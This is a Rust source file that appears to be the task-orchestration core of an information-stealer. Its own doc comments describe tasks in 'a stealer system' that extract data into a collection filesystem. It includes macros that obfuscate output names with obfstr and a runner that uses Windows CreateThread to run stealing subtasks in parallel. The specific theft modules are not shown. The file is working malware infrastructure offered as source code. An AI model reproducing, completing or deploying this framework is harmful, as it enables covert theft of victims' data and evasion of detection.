#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;

use alloc::boxed::Box;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::Collector;
use core::ffi::c_void;
use core::ptr::null_mut;
use filesystem::path::Path;
use filesystem::FileSystem;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::Foundation::HANDLE;
use windows_sys::Win32::Foundation::TRUE;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForMultipleObjects};

#[macro_export]
macro_rules! composite_task {
    ( $( $expr:expr ),* $(,)? ) => {
        CompositeTask::new(vec![
            $(
                alloc::sync::Arc::new($expr)
            ),*
        ])
    };
}

#[macro_export]
macro_rules! parent_name {
    ($name:expr) => {
        fn parent_name(&self) -> Option<alloc::string::String> {
            Some(obfstr::obfstr!($name).to_owned())
        }
    };
}

#[macro_export]
macro_rules! impl_composite_task_runner {
    ($task_type:ty) => {
        impl<C: collector::Collector, F: filesystem::FileSystem> Task<C, F> for $task_type {
            fn run(&self, parent: &filesystem::path::Path, filesystem: &F, collector: &C) {
                self.inner.run(parent, filesystem, collector);
            }
        }
    };

    ($task_type:ty, $parent_name:expr) => {
        impl<C: collector::Collector, F: filesystem::FileSystem> Task<C, F> for $task_type {
            $crate::parent_name!($parent_name);

            fn run(&self, parent: &filesystem::path::Path, filesystem: &F, collector: &C) {
                self.inner.run(parent, filesystem, collector);
            }
        }
    };
}

/// Trait representing a unit of work ("task") in a stealer system.
///
/// A task is responsible for extracting or copying data from a source
/// and writing its results to a target filesystem. It may also report
/// statistics about its actions using a `Collector`.
///
/// # Type Parameters
///
/// * `C` - The type of the statistics collector, implementing the [`Collector`] trait.
/// * `F` - The type of the destination filesystem, implementing the [`FileSystem`] trait.
pub trait Task<C: Collector, F: FileSystem>: Send + Sync {
    /// Returns the optional name of this task's output subdirectory.
    ///
    /// If `Some(name)` is returned, the task's output will be stored under `parent / name`.
    /// If `None`, the output is written directly into the `parent` directory.
    ///
    /// This allows a task to define its own output folder/file name if needed.
    fn parent_name(&self) -> Option<String> {
        None
    }

    /// Executes the task.
    ///
    /// # Parameters
    ///
    /// * `parent` - The parent path under which the task should store its output.
    ///   If `parent_name()` returns `Some(name)`, the task should store results in `parent / name`.
    ///
    /// * `filesystem` - The filesystem to which this task should write its output data.
    ///
    /// * `collector` - The statistics collector to record what and how much was collected.
    ///   Used for reporting and telemetry, e.g., number of files, total bytes, etc.
    ///
    /// # Notes
    ///
    /// Implementations should avoid panicking. All data output should be stored
    /// under the provided `parent` directory or a subfolder derived from it.
    fn run(&self, parent: &Path, filesystem: &F, collector: &C);
}

pub struct CompositeTask<C: Collector, F: FileSystem> {
    subtasks: Vec<Arc<dyn Task<C, F>>>,
}

impl<C: Collector, F: FileSystem> CompositeTask<C, F> {
    pub fn new(subtasks: Vec<Arc<dyn Task<C, F>>>) -> CompositeTask<C, F> {
        Self { subtasks }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for CompositeTask<C, F> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        match self.subtasks.len() {
            0 => (),
            1 => {
                let task = &self.subtasks[0];
                task.run(&task_path(task, parent), filesystem, collector);
            }
            _ => run_tasks(&self.subtasks, parent, filesystem, collector),
        }
    }
}

fn run_tasks<C, F>(tasks: &[Arc<dyn Task<C, F>>], parent: &Path, filesystem: &F, collector: &C)
where
    C: Collector,
    F: FileSystem,
{
    let mut handles: Vec<HANDLE> = Vec::new();

    for task in tasks {
        let params = Box::new(ThreadParams {
            task: task.clone(),
            path: task_path(task, parent),
            filesystem,
            collector,
        });

        let handle = unsafe {
            CreateThread(
                null_mut(),
                0,
                Some(thread_proc::<C, F>),
                Box::into_raw(params) as *mut _,
                0,
                null_mut(),
            )
        };

        if !handle.is_null() {
            handles.push(handle);
        }
    }

    unsafe {
        WaitForMultipleObjects(handles.len() as _, handles.as_ptr(), TRUE, 0xFFFFFFFF);
    }

    for handle in handles {
        unsafe {
            CloseHandle(handle);
        }
    }
}

fn task_path<C: Collector, F: FileSystem>(task: &Arc<dyn Task<C, F>>, parent: &Path) -> Path {
    match task.parent_name() {
        Some(name) => parent / name,
        None => parent.clone(),
    }
}

struct ThreadParams<'a, C: Collector, F: FileSystem> {
    task: Arc<dyn Task<C, F>>,
    path: Path,
    filesystem: &'a F,
    collector: &'a C,
}

#[allow(unsafe_op_in_unsafe_fn)]
unsafe extern "system" fn thread_proc<C: Collector, F: FileSystem>(param: *mut c_void) -> u32 {
    let params = Box::from_raw(param as *mut ThreadParams<C, F>);

    params
        .task
        .run(&params.path, params.filesystem, params.collector);

    drop(params);

    0
}
